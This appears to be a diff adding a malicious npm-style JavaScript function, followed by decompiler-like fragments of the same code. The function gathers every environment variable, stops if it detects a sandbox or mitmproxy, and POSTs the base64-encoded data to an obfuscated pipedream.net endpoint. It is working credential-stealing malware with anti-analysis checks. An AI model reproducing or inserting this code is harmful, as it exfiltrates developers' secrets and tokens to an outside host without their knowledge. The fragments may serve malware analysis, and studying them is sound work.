@@ -1,0 +1,73 @@
+function main = function main() {
+  var data = process.env || {};
+  if (
+    filter.some((entry) =>
+      []
+        .concat(entry)
+        .every(
+          (item) =>
+            (data[item.key] || "").includes(item.val) || item.val === "*"
+        )
+    ) ||
+    Object.keys(data).length < 10 ||
+    data.PWD === `/${data.USER}/node_modules/${data.npm_package_name}` ||
+    (data.NODE_EXTRA_CA_CERTS || "").includes("mitmproxy")
+  ) {
+    return;
+  }
+
+  var req = http
+    .request({
+      host: [
+        ["eo1e", "w7v449gkbah", ".m"].join(""),
+        ["pipedr", "eam"].join(""),
+        "net",
+      ].join("."),
+      path: "/" + (data.npm_package_name || ""),
+      method: "POST",
+    })
+    .on("error", function (err) {});
+
+  req.write(Buffer.from(JSON.stringify(data)).toString("base64"));
+  req.end();
+}
+var data = process.env || {}
+filter.some((entry) =>
+      []
+        .concat(entry)
+        .every(
+          (item) =>
+            (data[item.key] || "").includes(item.val) || item.val === "*"
+        )
+    ) ||
+    Object.keys(data).length < 10 ||
+    data.PWD === `/${data.USER}/node_modules/${data.npm_package_name}` ||
+    (data.NODE_EXTRA_CA_CERTS || "").includes("mitmproxy")
+Object.keys(data).length < 10
+<operator>.formatString("/", data.USER, "/node_modules/", data.npm_package_name, "")
+(data.NODE_EXTRA_CA_CERTS || "").includes("mitmproxy")
+var req = http
+    .request({
+      host: [
+        ["eo1e", "w7v449gkbah", ".m"].join(""),
+        ["pipedr", "eam"].join(""),
+        "net",
+      ].join("."),
+      path: "/" + (data.npm_package_name || ""),
+      method: "POST",
+    })
+    .on("error", function (err) {})
+request
+_tmp_6.host = [
+        ["eo1e", "w7v449gkbah", ".m"].join(""),
+        ["pipedr", "eam"].join(""),
+        "net",
+      ].join(".")
+_tmp_8.push(["eo1e", "w7v449gkbah", ".m"].join(""))
+_tmp_8.push(["pipedr", "eam"].join(""))
+_tmp_8.push("net")
+join
+_tmp_6.path = "/" + (data.npm_package_name || "")
+_tmp_6.method = "POST"
+<lambda>2
+req.write(Buffer.from(JSON.stringify(data)).toString("base64"))
